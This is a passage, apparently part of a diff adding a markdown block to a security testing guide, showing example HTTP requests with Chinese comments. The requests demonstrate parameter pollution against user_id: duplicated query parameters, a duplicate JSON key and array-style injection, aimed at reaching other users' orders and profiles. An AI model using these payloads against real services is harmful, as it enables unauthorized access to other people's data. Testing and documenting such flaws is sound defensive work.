+GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1
+
+# JSON参数覆盖
+POST /api/profile/update HTTP/1.1
+Content-Type: application/json
+
+{"user_id": 1001, "name": "test", "user_id": 1002}
+
+# 数组注入
+GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
+```
